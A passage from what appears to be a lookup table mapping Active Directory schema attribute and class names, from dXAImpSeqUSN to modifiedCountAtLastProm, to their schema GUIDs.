        "dXAImpSeqUSN" = "a8df73d4-c5ea-11d1-bbcb-0080c76670c0";
        "dXAInTemplateMap" = "a8df73d6-c5ea-11d1-bbcb-0080c76670c0";
        "dXALocalAdmin" = "a8df73d7-c5ea-11d1-bbcb-0080c76670c0";
        "dXANativeAddressType" = "a8df73d9-c5ea-11d1-bbcb-0080c76670c0";
        "dXAOutTemplateMap" = "a8df73da-c5ea-11d1-bbcb-0080c76670c0";
        "dXAPassword" = "a8df73db-c5ea-11d1-bbcb-0080c76670c0";
        "dXAPrevExchangeOptions" = "a8df73dc-c5ea-11d1-bbcb-0080c76670c0";
        "dXAPrevExportNativeOnly" = "a8df73dd-c5ea-11d1-bbcb-0080c76670c0";
        "dXAPrevInExchangeSensitivity" = "a8df73de-c5ea-11d1-bbcb-0080c76670c0";
        "dXAPrevRemoteEntries" = "a8df73df-c5ea-11d1-bbcb-0080c76670c0";
        "dXAPrevReplicationSensitivity" = "a8df73e0-c5ea-11d1-bbcb-0080c76670c0";
        "dXAPrevTemplateOptions" = "a8df73e1-c5ea-11d1-bbcb-0080c76670c0";
        "dXAPrevTypes" = "167757d8-47f3-11d1-a9c3-0000f80367c1";
        "dXARecipientCP" = "a8df73e2-c5ea-11d1-bbcb-0080c76670c0";
        "dXARemoteClient" = "a8df73e3-c5ea-11d1-bbcb-0080c76670c0";
        "dXAReqName" = "a8df73e7-c5ea-11d1-bbcb-0080c76670c0";
        "dXAReqSeq" = "a8df73e4-c5ea-11d1-bbcb-0080c76670c0";
        "dXAReqSeqTime" = "a8df73e5-c5ea-11d1-bbcb-0080c76670c0";
        "dXAReqSeqUSN" = "a8df73e6-c5ea-11d1-bbcb-0080c76670c0";
        "dXASiteServer" = "a8df74b0-c5ea-11d1-bbcb-0080c76670c0";
        "dXASvrSeq" = "a8df73e8-c5ea-11d1-bbcb-0080c76670c0";
        "dXASvrSeqTime" = "a8df73e9-c5ea-11d1-bbcb-0080c76670c0";
        "dXASvrSeqUSN" = "a8df73ea-c5ea-11d1-bbcb-0080c76670c0";
        "dXATemplateOptions" = "a8df73eb-c5ea-11d1-bbcb-0080c76670c0";
        "dXATemplateTimeStamp" = "a8df73ec-c5ea-11d1-bbcb-0080c76670c0";
        "dXATypes" = "a8df73ed-c5ea-11d1-bbcb-0080c76670c0";
        "dXAUnConfContainerList" = "a8df73ee-c5ea-11d1-bbcb-0080c76670c0";
        "dXRequestor" = "a8df74ae-c5ea-11d1-bbcb-0080c76670c0";
        "dXServerConn" = "a8df74af-c5ea-11d1-bbcb-0080c76670c0";
        "dynamicLDAPServer" = "52458021-ca6a-11d0-afff-0000f80367c1";
        "dynamicObject" = "66d51249-3355-4c1f-b24e-81f252aca23b";
        "eFSPolicy" = "8e4eb2ec-4712-11d0-a1a0-00c04fd930c9";
        "employeeID" = "bf967962-0de6-11d0-a285-00aa003049e2";
        "employeeNumber" = "a8df73ef-c5ea-11d1-bbcb-0080c76670c0";
        "employeeType" = "a8df73f0-c5ea-11d1-bbcb-0080c76670c0";
        "enableCompatibility" = "a8df73f1-c5ea-11d1-bbcb-0080c76670c0";
        "Enabled" = "a8df73f2-c5ea-11d1-bbcb-0080c76670c0";
        "enabledAuthorizationPackages" = "a8df73f3-c5ea-11d1-bbcb-0080c76670c0";
        "enabledConnection" = "bf967963-0de6-11d0-a285-00aa003049e2";
        "enabledProtocolCfg" = "a8df73f4-c5ea-11d1-bbcb-0080c76670c0";
        "enabledProtocols" = "f0f8ff8c-1191-11d0-a060-00aa006c33ed";
        "encapsulationMethod" = "a8df73f5-c5ea-11d1-bbcb-0080c76670c0";
        "encrypt" = "a8df73f6-c5ea-11d1-bbcb-0080c76670c0";
        "encryptAlgListNA" = "a8df73f7-c5ea-11d1-bbcb-0080c76670c0";
        "encryptAlgListOther" = "a8df73f8-c5ea-11d1-bbcb-0080c76670c0";
        "encryptAlgSelectedNA" = "a8df73f9-c5ea-11d1-bbcb-0080c76670c0";
        "encryptAlgSelectedOther" = "a8df73fa-c5ea-11d1-bbcb-0080c76670c0";
        "encryptionCfg" = "a8df74b1-c5ea-11d1-bbcb-0080c76670c0";
        "enrollmentProviders" = "2a39c5b3-8960-11d1-aebc-0000f80367c1";
        "entryTTL" = "d213decc-d81a-4384-aac2-dcfcfd631cf8";
        "exchangeAdminService" = "a8df74b2-c5ea-11d1-bbcb-0080c76670c0";
        "expandDLsLocally" = "a8df73fb-c5ea-11d1-bbcb-0080c76670c0";
        "expirationTime" = "bf967965-0de6-11d0-a285-00aa003049e2";
        "exportContainers" = "a8df73fc-c5ea-11d1-bbcb-0080c76670c0";
        "exportCustomRecipients" = "a8df73fd-c5ea-11d1-bbcb-0080c76670c0";
        "extendedAttributeInfo" = "9a7ad947-ca53-11d1-bbd0-0080c76670c0";
        "extendedCharsAllowed" = "bf967966-0de6-11d0-a285-00aa003049e2";
        "extendedClassInfo" = "9a7ad948-ca53-11d1-bbd0-0080c76670c0";
        "extensionAttribute1" = "bf967967-0de6-11d0-a285-00aa003049e2";
        "extensionAttribute2" = "bf967969-0de6-11d0-a285-00aa003049e2";
        "extensionAttribute3" = "bf96796a-0de6-11d0-a285-00aa003049e2";
        "extensionAttribute4" = "bf96796b-0de6-11d0-a285-00aa003049e2";
        "extensionAttribute5" = "bf96796c-0de6-11d0-a285-00aa003049e2";
        "extensionAttribute6" = "bf96796d-0de6-11d0-a285-00aa003049e2";
        "extensionAttribute7" = "bf96796e-0de6-11d0-a285-00aa003049e2";
        "extensionAttribute8" = "bf96796f-0de6-11d0-a285-00aa003049e2";
        "extensionAttribute9" = "bf967970-0de6-11d0-a285-00aa003049e2";
        "extensionAttribute10" = "bf967968-0de6-11d0-a285-00aa003049e2";
        "extensionAttribute11" = "167757f6-47f3-11d1-a9c3-0000f80367c1";
        "extensionAttribute12" = "167757f7-47f3-11d1-a9c3-0000f80367c1";
        "extensionAttribute13" = "167757f8-47f3-11d1-a9c3-0000f80367c1";
        "extensionAttribute14" = "167757f9-47f3-11d1-a9c3-0000f80367c1";
        "extensionAttribute15" = "167757fa-47f3-11d1-a9c3-0000f80367c1";
        "extensionData" = "bf967971-0de6-11d0-a285-00aa003049e2";
        "extensionName" = "bf967972-0de6-11d0-a285-00aa003049e2";
        "extraColumns" = "d24e2846-1dd9-4bcf-99d7-a6227cc86da7";
        "facsimileTelephoneNumber" = "bf967974-0de6-11d0-a285-00aa003049e2";
        "fileExtPriority" = "d9e18315-8939-11d1-aebc-0000f80367c1";
        "fileLinkTracking" = "dd712229-10e4-11d0-a05f-00aa006c33ed";
        "fileLinkTrackingEntry" = "8e4eb2ed-4712-11d0-a1a0-00c04fd930c9";
        "fileVersion" = "167757fb-47f3-11d1-a9c3-0000f80367c1";
        "filterLocalAddresses" = "a8df73fe-c5ea-11d1-bbcb-0080c76670c0";
        "flags" = "bf967976-0de6-11d0-a285-00aa003049e2";
        "flatName" = "b7b13117-b82e-11d0-afee-0000f80367c1";
        "folderPathname" = "f0f8ff8d-1191-11d0-a060-00aa006c33ed";
        "forceLogoff" = "bf967977-0de6-11d0-a285-00aa003049e2";
        "foreignIdentifier" = "3e97891e-8c01-11d0-afda-00c04fd930c9";
        "foreignSecurityPrincipal" = "89e31c12-8530-11d0-afda-00c04fd930c9";
        "formData" = "a8df7400-c5ea-11d1-bbcb-0080c76670c0";
        "forwardingAddress" = "167757ff-47f3-11d1-a9c3-0000f80367c1";
        "friendlyCountry" = "c498f152-dc6b-474a-9f52-7cdba3d7d351";
        "friendlyNames" = "7bfdcb88-4807-11d1-a9c3-0000f80367c1";
        "fromEntry" = "9a7ad949-ca53-11d1-bbd0-0080c76670c0";
        "fromServer" = "bf967979-0de6-11d0-a285-00aa003049e2";
        "frsComputerReference" = "2a132578-9373-11d1-aebc-0000f80367c1";
        "frsComputerReferenceBL" = "2a132579-9373-11d1-aebc-0000f80367c1";
        "fRSControlDataCreation" = "2a13257a-9373-11d1-aebc-0000f80367c1";
        "fRSControlInboundBacklog" = "2a13257b-9373-11d1-aebc-0000f80367c1";
        "fRSControlOutboundBacklog" = "2a13257c-9373-11d1-aebc-0000f80367c1";
        "fRSDirectoryFilter" = "1be8f171-a9ff-11d0-afe2-00c04fd930c9";
        "fRSDSPoll" = "1be8f177-a9ff-11d0-afe2-00c04fd930c9";
        "fRSExtensions" = "52458020-ca6a-11d0-afff-0000f80367c1";
        "fRSFaultCondition" = "1be8f178-a9ff-11d0-afe2-00c04fd930c9";
        "fRSFileFilter" = "1be8f170-a9ff-11d0-afe2-00c04fd930c9";
        "fRSFlags" = "2a13257d-9373-11d1-aebc-0000f80367c1";
        "fRSLevelLimit" = "5245801e-ca6a-11d0-afff-0000f80367c1";
        "fRSMemberReference" = "2a13257e-9373-11d1-aebc-0000f80367c1";
        "fRSMemberReferenceBL" = "2a13257f-9373-11d1-aebc-0000f80367c1";
        "fRSPartnerAuthLevel" = "2a132580-9373-11d1-aebc-0000f80367c1";
        "fRSPrimaryMember" = "2a132581-9373-11d1-aebc-0000f80367c1";
        "fRSReplicaSetGUID" = "5245801a-ca6a-11d0-afff-0000f80367c1";
        "fRSReplicaSetType" = "26d9736b-6070-11d1-a9c6-0000f80367c1";
        "fRSRootPath" = "1be8f174-a9ff-11d0-afe2-00c04fd930c9";
        "fRSRootSecurity" = "5245801f-ca6a-11d0-afff-0000f80367c1";
        "fRSServiceCommand" = "ddac0cee-af8f-11d0-afeb-00c04fd930c9";
        "fRSServiceCommandStatus" = "2a132582-9373-11d1-aebc-0000f80367c1";
        "fRSStagingPath" = "1be8f175-a9ff-11d0-afe2-00c04fd930c9";
        "fRSTimeLastCommand" = "2a132583-9373-11d1-aebc-0000f80367c1";
        "fRSTimeLastConfigChange" = "2a132584-9373-11d1-aebc-0000f80367c1";
        "fRSUpdateTimeout" = "1be8f172-a9ff-11d0-afe2-00c04fd930c9";
        "fRSVersion" = "2a132585-9373-11d1-aebc-0000f80367c1";
        "fRSVersionGUID" = "26d9736c-6070-11d1-a9c6-0000f80367c1";
        "fRSWorkingPath" = "1be8f173-a9ff-11d0-afe2-00c04fd930c9";
        "fSMORoleOwner" = "66171887-8f3c-11d0-afda-00c04fd930c9";
        "fTDfs" = "8447f9f3-1027-11d0-a05f-00aa006c33ed";
        "garbageCollPeriod" = "5fd424a1-1262-11d0-a060-00aa006c33ed";
        "gatewayLocalCred" = "a8df7401-c5ea-11d1-bbcb-0080c76670c0";
        "gatewayLocalDesig" = "a8df7402-c5ea-11d1-bbcb-0080c76670c0";
        "gatewayProxy" = "16775802-47f3-11d1-a9c3-0000f80367c1";
        "gatewayRoutingTree" = "a8df7403-c5ea-11d1-bbcb-0080c76670c0";
        "gecos" = "a3e03f1f-1d55-4253-a0af-30c2a784e46e";
        "generatedConnection" = "bf96797a-0de6-11d0-a285-00aa003049e2";
        "generationQualifier" = "16775804-47f3-11d1-a9c3-0000f80367c1";
        "gidNumber" = "c5b95f0c-ec9e-41c4-849c-b46597ed6696";
        "givenName" = "f0f8ff8e-1191-11d0-a060-00aa006c33ed";
        "globalAddressList" = "f754c748-06f4-11d2-aa53-00c04fd7d83a";
        "globalAddressList2" = "4898f63d-4112-477c-8826-3ca00bd8277d";
        "governsID" = "bf96797d-0de6-11d0-a285-00aa003049e2";
        "gPCFileSysPath" = "f30e3bc1-9ff0-11d1-b603-0000f80367c1";
        "gPCFunctionalityVersion" = "f30e3bc0-9ff0-11d1-b603-0000f80367c1";
        "gPCMachineExtensionNames" = "32ff8ecc-783f-11d2-9916-0000f87a57d4";
        "gPCUserExtensionNames" = "42a75fc6-783f-11d2-9916-0000f87a57d4";
        "gPCWQLFilter" = "7bd4c7a6-1add-4436-8c04-3999a880154c";
        "gPLink" = "f30e3bbe-9ff0-11d1-b603-0000f80367c1";
        "gPOptions" = "f30e3bbf-9ff0-11d1-b603-0000f80367c1";
        "group" = "bf967a9c-0de6-11d0-a285-00aa003049e2";
        "groupAttributes" = "bf96797e-0de6-11d0-a285-00aa003049e2";
        "groupMembershipSAM" = "bf967980-0de6-11d0-a285-00aa003049e2";
        "groupOfNames" = "bf967a9d-0de6-11d0-a285-00aa003049e2";
        "groupOfUniqueNames" = "0310a911-93a3-4e21-a7a3-55d85ab2c48b";
        "groupPolicyContainer" = "f30e3bc2-9ff0-11d1-b603-0000f80367c1";
        "groupPriority" = "eea65905-8ac6-11d0-afda-00c04fd930c9";
        "groupsToIgnore" = "eea65904-8ac6-11d0-afda-00c04fd930c9";
        "groupType" = "9a9a021e-4a5b-11d1-a9c3-0000f80367c1";
        "gWARTLastModified" = "8fa43470-b093-11d2-aa06-00c04f8eedd8";
        "hasMasterNCs" = "bf967982-0de6-11d0-a285-00aa003049e2";
        "hasPartialReplicaNCs" = "bf967981-0de6-11d0-a285-00aa003049e2";
        "helpData16" = "5fd424a7-1262-11d0-a060-00aa006c33ed";
        "helpData32" = "5fd424a8-1262-11d0-a060-00aa006c33ed";
        "helpFileName" = "5fd424a9-1262-11d0-a060-00aa006c33ed";
        "heuristics" = "bf967983-0de6-11d0-a285-00aa003049e2";
        "hideDLMembership" = "a8df7405-c5ea-11d1-bbcb-0080c76670c0";
        "hideFromAB" = "ec05b750-a977-4efe-8e8d-ba6c1a6e33a8";
        "homeDirectory" = "bf967985-0de6-11d0-a285-00aa003049e2";
        "homeDrive" = "bf967986-0de6-11d0-a285-00aa003049e2";
        "homeMDB" = "bf967987-0de6-11d0-a285-00aa003049e2";
        "homeMDBBL" = "bf967988-0de6-11d0-a285-00aa003049e2";
        "homeMTA" = "bf967989-0de6-11d0-a285-00aa003049e2";
        "homePhone" = "f0f8ffa1-1191-11d0-a060-00aa006c33ed";
        "homePostalAddress" = "16775781-47f3-11d1-a9c3-0000f80367c1";
        "host" = "6043df71-fa48-46cf-ab7c-cbd54644b22d";
        "houseIdentifier" = "a45398b7-c44a-4eb6-82d3-13c10946dbfe";
        "hTTPPubABAttributes" = "a8df7408-c5ea-11d1-bbcb-0080c76670c0";
        "hTTPPubGAL" = "a8df7409-c5ea-11d1-bbcb-0080c76670c0";
        "hTTPPubGALLimit" = "a8df740a-c5ea-11d1-bbcb-0080c76670c0";
        "hTTPPubPF" = "a8df740b-c5ea-11d1-bbcb-0080c76670c0";
        "hTTPServers" = "a8df740c-c5ea-11d1-bbcb-0080c76670c0";
        "iconPath" = "f0f8ff83-1191-11d0-a060-00aa006c33ed";
        "ieee802Device" = "a699e529-a637-4b7d-a0fb-5dc466a0b8a7";
        "implementedCategories" = "7d6c0e92-7e20-11d0-afd6-00c04fd930c9";
        "importContainer" = "a8df740d-c5ea-11d1-bbcb-0080c76670c0";
        "importedFrom" = "bf96798a-0de6-11d0-a285-00aa003049e2";
        "inboundSites" = "a8df7414-c5ea-11d1-bbcb-0080c76670c0";
        "incomingMsgSizeLimit" = "1677581a-47f3-11d1-a9c3-0000f80367c1";
        "indexedScopes" = "7bfdcb87-4807-11d1-a9c3-0000f80367c1";
        "indexServerCatalog" = "7bfdcb8a-4807-11d1-a9c3-0000f80367c1";
        "inetOrgPerson" = "4828cc14-1437-45bc-9b07-ad6f015e5f28";
        "info" = "bf96793e-0de6-11d0-a285-00aa003049e2";
        "infrastructureUpdate" = "2df90d89-009f-11d2-aa4c-00c04fd7d83a";
        "initialAuthIncoming" = "52458023-ca6a-11d0-afff-0000f80367c1";
        "initialAuthOutgoing" = "52458024-ca6a-11d0-afff-0000f80367c1";
        "initials" = "f0f8ff90-1191-11d0-a060-00aa006c33ed";
        "iNSAdmin" = "a8df7416-c5ea-11d1-bbcb-0080c76670c0";
        "installUiLevel" = "96a7dd64-9118-11d1-aebc-0000f80367c1";
        "instanceType" = "bf96798c-0de6-11d0-a285-00aa003049e2";
        "intellimirrorGroup" = "07383086-91df-11d1-aebc-0000f80367c1";
        "intellimirrorSCP" = "07383085-91df-11d1-aebc-0000f80367c1";
        "internationalISDNNumber" = "bf96798d-0de6-11d0-a285-00aa003049e2";
        "internetEncoding" = "1677581d-47f3-11d1-a9c3-0000f80367c1";
        "interSiteTopologyFailover" = "b7c69e60-2cc7-11d2-854e-00a0c983f608";
        "interSiteTopologyGenerator" = "b7c69e5e-2cc7-11d2-854e-00a0c983f608";
        "interSiteTopologyRenew" = "b7c69e5f-2cc7-11d2-854e-00a0c983f608";
        "interSiteTransport" = "26d97376-6070-11d1-a9c6-0000f80367c1";
        "interSiteTransportContainer" = "26d97375-6070-11d1-a9c6-0000f80367c1";
        "invocationId" = "bf96798e-0de6-11d0-a285-00aa003049e2";
        "ipHost" = "ab911646-8827-4f95-8780-5a8f008eb68f";
        "ipHostNumber" = "de8bb721-85dc-4fde-b687-9657688e667e";
        "ipNetmaskNumber" = "6ff64fcd-462e-4f62-b44a-9a5347659eb9";
        "ipNetwork" = "d95836c3-143e-43fb-992a-b057f1ecadf9";
        "ipNetworkNumber" = "4e3854f4-3087-42a4-a813-bb0c528958d3";
        "ipPhone" = "4d146e4a-48d4-11d1-a9c3-0000f80367c1";
        "ipProtocol" = "9c2dcbd2-fbf0-4dc7-ace0-8356dcd0f013";
        "ipProtocolNumber" = "ebf5c6eb-0e2d-4415-9670-1081993b4211";
        "ipsecBase" = "b40ff825-427a-11d1-a9c2-0000f80367c1";
        "ipsecData" = "b40ff81f-427a-11d1-a9c2-0000f80367c1";
        "ipsecDataType" = "b40ff81e-427a-11d1-a9c2-0000f80367c1";
        "ipsecFilter" = "b40ff826-427a-11d1-a9c2-0000f80367c1";
        "ipsecFilterReference" = "b40ff823-427a-11d1-a9c2-0000f80367c1";
        "ipsecID" = "b40ff81d-427a-11d1-a9c2-0000f80367c1";
        "ipsecISAKMPPolicy" = "b40ff828-427a-11d1-a9c2-0000f80367c1";
        "ipsecISAKMPReference" = "b40ff820-427a-11d1-a9c2-0000f80367c1";
        "ipsecName" = "b40ff81c-427a-11d1-a9c2-0000f80367c1";
        "ipsecNegotiationPolicy" = "b40ff827-427a-11d1-a9c2-0000f80367c1";
        "iPSECNegotiationPolicyAction" = "07383075-91df-11d1-aebc-0000f80367c1";
        "ipsecNegotiationPolicyReference" = "b40ff822-427a-11d1-a9c2-0000f80367c1";
        "iPSECNegotiationPolicyType" = "07383074-91df-11d1-aebc-0000f80367c1";
        "ipsecNFA" = "b40ff829-427a-11d1-a9c2-0000f80367c1";
        "ipsecNFAReference" = "b40ff821-427a-11d1-a9c2-0000f80367c1";
        "ipsecOwnersReference" = "b40ff824-427a-11d1-a9c2-0000f80367c1";
        "ipsecPolicy" = "b7b13121-b82e-11d0-afee-0000f80367c1";
        "ipsecPolicyReference" = "b7b13118-b82e-11d0-afee-0000f80367c1";
        "ipService" = "2517fadf-fa97-48ad-9de6-79ac5721f864";
        "ipServicePort" = "ff2daebf-f463-495a-8405-3e483641eaa2";
        "ipServiceProtocol" = "cd96ec0b-1ed6-43b4-b26b-f170b645883f";
        "isCriticalSystemObject" = "00fbf30d-91fe-11d1-aebc-0000f80367c1";
        "isDefunct" = "28630ebe-41d5-11d1-a9c1-0000f80367c1";
        "isDeleted" = "bf96798f-0de6-11d0-a285-00aa003049e2";
        "isEphemeral" = "f4c453f0-c5f1-11d1-bbcb-0080c76670c0";
        "isMemberOfPartialAttributeSet" = "19405b9d-3cfa-11d1-a9c0-0000f80367c1";
        "isPrivilegeHolder" = "19405b9c-3cfa-11d1-a9c0-0000f80367c1";
        "isRecycled" = "8fb59256-55f1-444b-aacb-f5b482fe3459";
        "isSingleValued" = "bf967992-0de6-11d0-a285-00aa003049e2";
        "jpegPhoto" = "bac80572-09c4-4fa9-9ae6-7628d7adbe0e";
        "kCCStatus" = "5fd424ae-1262-11d0-a060-00aa006c33ed";
        "keywords" = "bf967993-0de6-11d0-a285-00aa003049e2";
        "kMServer" = "1677581e-47f3-11d1-a9c3-0000f80367c1";
        "knowledgeInformation" = "1677581f-47f3-11d1-a9c3-0000f80367c1";
        "l" = "bf9679a2-0de6-11d0-a285-00aa003049e2";
        "labeledURI" = "c569bb46-c680-44bc-a273-e6c227d71b45";
        "language" = "16775821-47f3-11d1-a9c3-0000f80367c1";
        "languageCode" = "bf967994-0de6-11d0-a285-00aa003049e2";
        "lastBackupRestorationTime" = "1fbb0be8-ba63-11d0-afef-0000f80367c1";
        "lastContentIndexed" = "bf967995-0de6-11d0-a285-00aa003049e2";
        "lastKnownParent" = "52ab8670-5709-11d1-a9c6-0000f80367c1";
        "lastLogoff" = "bf967996-0de6-11d0-a285-00aa003049e2";
        "lastLogon" = "bf967997-0de6-11d0-a285-00aa003049e2";
        "lastLogonTimestamp" = "c0e20a04-0e5a-4ff3-9482-5efeaecd7060";
        "lastSetTime" = "bf967998-0de6-11d0-a285-00aa003049e2";
        "lastUpdateSequence" = "7d6c0e9c-7e20-11d0-afd6-00c04fd930c9";
        "lDAPAdminLimits" = "7359a352-90f7-11d1-aebc-0000f80367c1";
        "lDAPDisplayName" = "bf96799a-0de6-11d0-a285-00aa003049e2";
        "lDAPIPDenyList" = "7359a353-90f7-11d1-aebc-0000f80367c1";
        "lDAPSearchCfg" = "a8df7417-c5ea-11d1-bbcb-0080c76670c0";
        "leaf" = "bf967a9e-0de6-11d0-a285-00aa003049e2";
        "legacyExchangeDN" = "28630ebc-41d5-11d1-a9c1-0000f80367c1";
        "licensingSiteSettings" = "1be8f17d-a9ff-11d0-afe2-00c04fd930c9";
        "lineWrap" = "a8df7418-c5ea-11d1-bbcb-0080c76670c0";
        "linkID" = "bf96799b-0de6-11d0-a285-00aa003049e2";
        "linkTrackObjectMoveTable" = "ddac0cf5-af8f-11d0-afeb-00c04fd930c9";
        "linkTrackOMTEntry" = "ddac0cf7-af8f-11d0-afeb-00c04fd930c9";
        "linkTrackSecret" = "2ae80fe2-47b4-11d0-a1a4-00c04fd930c9";
        "linkTrackVolEntry" = "ddac0cf6-af8f-11d0-afeb-00c04fd930c9";
        "linkTrackVolumeTable" = "ddac0cf4-af8f-11d0-afeb-00c04fd930c9";
        "listPublicFolders" = "a8df7419-c5ea-11d1-bbcb-0080c76670c0";
        "lmPwdHistory" = "bf96799d-0de6-11d0-a285-00aa003049e2";
        "localBridgeHead" = "a8df741a-c5ea-11d1-bbcb-0080c76670c0";
        "localBridgeHeadAddress" = "a8df741b-c5ea-11d1-bbcb-0080c76670c0";
        "localDXA" = "a8df74b5-c5ea-11d1-bbcb-0080c76670c0";
        "localeID" = "bf9679a1-0de6-11d0-a285-00aa003049e2";
        "localInitialTurn" = "a8df741c-c5ea-11d1-bbcb-0080c76670c0";
        "locality" = "bf967aa0-0de6-11d0-a285-00aa003049e2";
        "localizationDisplayId" = "a746f0d1-78d0-11d2-9916-0000f87a57d4";
        "localizedDescription" = "d9e18316-8939-11d1-aebc-0000f80367c1";
        "localPolicyFlags" = "bf96799e-0de6-11d0-a285-00aa003049e2";
        "localPolicyReference" = "80a67e4d-9f22-11d0-afdd-00c04fd930c9";
        "location" = "09dcb79f-165f-11d0-a064-00aa006c33ed";
        "lockoutDuration" = "bf9679a5-0de6-11d0-a285-00aa003049e2";
        "lockOutObservationWindow" = "bf9679a4-0de6-11d0-a285-00aa003049e2";
        "lockoutThreshold" = "bf9679a6-0de6-11d0-a285-00aa003049e2";
        "lockoutTime" = "28630ebf-41d5-11d1-a9c1-0000f80367c1";
        "logFilename" = "a8df741d-c5ea-11d1-bbcb-0080c76670c0";
        "loginShell" = "a553d12c-3231-4c5e-8adf-8d189697721e";
        "logonCount" = "bf9679aa-0de6-11d0-a285-00aa003049e2";
        "logonHours" = "bf9679ab-0de6-11d0-a285-00aa003049e2";
        "logonWorkstation" = "bf9679ac-0de6-11d0-a285-00aa003049e2";
        "logRolloverInterval" = "bf9679a7-0de6-11d0-a285-00aa003049e2";
        "lostAndFound" = "52ab8671-5709-11d1-a9c6-0000f80367c1";
        "lSACreationTime" = "bf9679ad-0de6-11d0-a285-00aa003049e2";
        "lSAModifiedCount" = "bf9679ae-0de6-11d0-a285-00aa003049e2";
        "macAddress" = "e6a522dd-9770-43e1-89de-1de5044328f7";
        "machineArchitecture" = "bf9679af-0de6-11d0-a285-00aa003049e2";
        "machinePasswordChangeInterval" = "c9b6358e-bb38-11d0-afef-0000f80367c1";
        "machineRole" = "bf9679b2-0de6-11d0-a285-00aa003049e2";
        "machineWidePolicy" = "80a67e4f-9f22-11d0-afdd-00c04fd930c9";
        "mail" = "bf967961-0de6-11d0-a285-00aa003049e2";
        "mailAddress" = "26d9736f-6070-11d1-a9c6-0000f80367c1";
        "mailConnector" = "a8df74b6-c5ea-11d1-bbcb-0080c76670c0";
        "mailGateway" = "a8df74b7-c5ea-11d1-bbcb-0080c76670c0";
        "mailNickname" = "bf9679b3-0de6-11d0-a285-00aa003049e2";
        "mailRecipient" = "bf967aa1-0de6-11d0-a285-00aa003049e2";
        "managedBy" = "0296c120-40da-11d1-a9c0-0000f80367c1";
        "managedObjects" = "0296c124-40da-11d1-a9c0-0000f80367c1";
        "manager" = "bf9679b5-0de6-11d0-a285-00aa003049e2";
        "mAPIID" = "bf9679b7-0de6-11d0-a285-00aa003049e2";
        "mAPIRecipient" = "bf9679b8-0de6-11d0-a285-00aa003049e2";
        "marshalledInterface" = "bf9679b9-0de6-11d0-a285-00aa003049e2";
        "masteredBy" = "e48e64e0-12c9-11d3-9102-00c04fd91ab1";
        "maximumObjectID" = "a8df741e-c5ea-11d1-bbcb-0080c76670c0";
        "maxPwdAge" = "bf9679bb-0de6-11d0-a285-00aa003049e2";
        "maxRenewAge" = "bf9679bc-0de6-11d0-a285-00aa003049e2";
        "maxStorage" = "bf9679bd-0de6-11d0-a285-00aa003049e2";
        "maxTicketAge" = "bf9679be-0de6-11d0-a285-00aa003049e2";
        "mayContain" = "bf9679bf-0de6-11d0-a285-00aa003049e2";
        "mDBBackoffInterval" = "a8df741f-c5ea-11d1-bbcb-0080c76670c0";
        "mDBMsgTimeOutPeriod" = "a8df7420-c5ea-11d1-bbcb-0080c76670c0";
        "mDBOverHardQuotaLimit" = "8fcf1ec4-b093-11d2-aa06-00c04f8eedd8";
        "mDBOverQuotaLimit" = "f0f8ff91-1191-11d0-a060-00aa006c33ed";
        "mDBStorageQuota" = "f0f8ff92-1191-11d0-a060-00aa006c33ed";
        "mDBUnreadLimit" = "a8df7421-c5ea-11d1-bbcb-0080c76670c0";
        "mDBUseDefaults" = "f0f8ff93-1191-11d0-a060-00aa006c33ed";
        "meeting" = "11b6cc94-48c4-11d1-a9c3-0000f80367c1";
        "meetingAdvertiseScope" = "11b6cc8b-48c4-11d1-a9c3-0000f80367c1";
        "meetingApplication" = "11b6cc83-48c4-11d1-a9c3-0000f80367c1";
        "meetingBandwidth" = "11b6cc92-48c4-11d1-a9c3-0000f80367c1";
        "meetingBlob" = "11b6cc93-48c4-11d1-a9c3-0000f80367c1";
        "meetingContactInfo" = "11b6cc87-48c4-11d1-a9c3-0000f80367c1";
        "meetingDescription" = "11b6cc7e-48c4-11d1-a9c3-0000f80367c1";
        "meetingEndTime" = "11b6cc91-48c4-11d1-a9c3-0000f80367c1";
        "meetingID" = "11b6cc7c-48c4-11d1-a9c3-0000f80367c1";
        "meetingIP" = "11b6cc89-48c4-11d1-a9c3-0000f80367c1";
        "meetingIsEncrypted" = "11b6cc8e-48c4-11d1-a9c3-0000f80367c1";
        "meetingKeyword" = "11b6cc7f-48c4-11d1-a9c3-0000f80367c1";
        "meetingLanguage" = "11b6cc84-48c4-11d1-a9c3-0000f80367c1";
        "meetingLocation" = "11b6cc80-48c4-11d1-a9c3-0000f80367c1";
        "meetingMaxParticipants" = "11b6cc85-48c4-11d1-a9c3-0000f80367c1";
        "meetingName" = "11b6cc7d-48c4-11d1-a9c3-0000f80367c1";
        "meetingOriginator" = "11b6cc86-48c4-11d1-a9c3-0000f80367c1";
        "meetingOwner" = "11b6cc88-48c4-11d1-a9c3-0000f80367c1";
        "meetingProtocol" = "11b6cc81-48c4-11d1-a9c3-0000f80367c1";
        "meetingRating" = "11b6cc8d-48c4-11d1-a9c3-0000f80367c1";
        "meetingRecurrence" = "11b6cc8f-48c4-11d1-a9c3-0000f80367c1";
        "meetingScope" = "11b6cc8a-48c4-11d1-a9c3-0000f80367c1";
        "meetingStartTime" = "11b6cc90-48c4-11d1-a9c3-0000f80367c1";
        "meetingType" = "11b6cc82-48c4-11d1-a9c3-0000f80367c1";
        "meetingURL" = "11b6cc8c-48c4-11d1-a9c3-0000f80367c1";
        "member" = "bf9679c0-0de6-11d0-a285-00aa003049e2";
        "memberNisNetgroup" = "0f6a17dc-53e5-4be8-9442-8f3ce2f9012a";
        "memberOf" = "bf967991-0de6-11d0-a285-00aa003049e2";
        "memberUid" = "03dab236-672e-4f61-ab64-f77d2dc2ffab";
        "messageSizeLimit" = "167757e2-47f3-11d1-a9c3-0000f80367c1";
        "messageTrackingEnabled" = "a8df7422-c5ea-11d1-bbcb-0080c76670c0";
        "mHSLinkMonitoringConfig" = "a8df74b9-c5ea-11d1-bbcb-0080c76670c0";
        "mHSMonitoringConfig" = "a8df74bb-c5ea-11d1-bbcb-0080c76670c0";
        "mhsORAddress" = "0296c122-40da-11d1-a9c0-0000f80367c1";
        "mHSServerMonitoringConfig" = "a8df74bd-c5ea-11d1-bbcb-0080c76670c0";
        "middleName" = "bf9679f2-0de6-11d0-a285-00aa003049e2";
        "minPwdAge" = "bf9679c2-0de6-11d0-a285-00aa003049e2";
        "minPwdLength" = "bf9679c3-0de6-11d0-a285-00aa003049e2";
        "minTicketAge" = "bf9679c4-0de6-11d0-a285-00aa003049e2";
        "mobile" = "f0f8ffa3-1191-11d0-a060-00aa006c33ed";
        "modifiedCount" = "bf9679c5-0de6-11d0-a285-00aa003049e2";
        "modifiedCountAtLastProm" = "bf9679c6-0de6-11d0-a285-00aa003049e2";
